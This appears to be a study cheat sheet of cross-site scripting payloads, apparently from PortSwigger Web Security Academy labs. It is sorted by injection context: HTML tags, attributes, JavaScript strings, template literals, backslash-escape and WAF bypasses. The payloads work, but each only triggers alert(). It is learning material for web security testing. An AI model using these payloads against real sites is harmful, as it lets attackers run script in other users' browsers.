[[XSS]]
# Between HTML tags
```html
<script>alert(document.domain)</script>
<img src=1 onerror=alert(1)>
```

# XSS in HTML tag attributes
```html
"><script>alert(document.domain)</script>
```

```html
" autofocus onfocus=alert(document.domain) x="
```

```html
<a href="javascript:alert(document.domain)">
```
##### Using `accesskey` to invoke some JS code placed in a attribute of `canonical` tag.
Final payload:
```
https://YOUR-LAB-ID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)
```
How it looks in DOM:
```html
<link rel="canonical" href="https://0ace00fb0457e86f80a1210c00d900da.web-security-academy.net/?" accesskey="x" onclick="alert(1)">
```

# XSS into JavaScript
##### Terminating the existing script
```js
<script>
...
var input = 'controllable data here';
...
</script>
```
Payload:
```html
</script><img src=1 onerror=alert(document.domain)>
```

##### Breaking out of a JavaScript string
```javascript
'-alert(document.domain)-'
';alert(document.domain)//
```

##### Bypass escaping single quotes with a backslash
For example, suppose that the input:
`';alert(document.domain)//`

gets converted to:
`\';alert(document.domain)//`

You can now use the alternative payload:
`\';alert(document.domain)//`

which gets converted to:
`\\';alert(document.domain)//`

##### WAF blocks some characters
https://portswigger.net/research/xss-without-parentheses-and-semi-colons
Sink:
```html
<a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d5'}).finally(_ =&gt; window.location = '/')">Back to Blog</a>
```
Payload:
```
https://0a1e00d90352e31e86f7868200e60090.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
```
HTML:
```html
<a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d5%26%27},x%3dx%3d%3e{throw/**/onerror%3dalert,1337},toString%3dx,window%2b%27%27,{x%3a%27'}).finally(_ =&gt; window.location = '/')">Back to Blog</a>
```
Parsed JS:
```js
fetch('/analytics', {
    method: 'post',
    body: '/post?postId=5&'
}, x = x => {
    throw /**/
    onerror = alert,
    1337
}
, toString = x, window + '', {
    x: ''
}).finally(_ => window.location = '/')
```
##### Making use of HTML-encoding
Context:
```html
<a href="#" onclick="... var input='controllable data here'; ...">
```
payload:
```html
&apos;-alert(document.domain)-&apos;
```

##### XSS in JavaScript template literals
Example:
```html
<script> ... var input = `controllable data here`; ... </script>
```
payload:
```js
${alert(document.domain)}
```
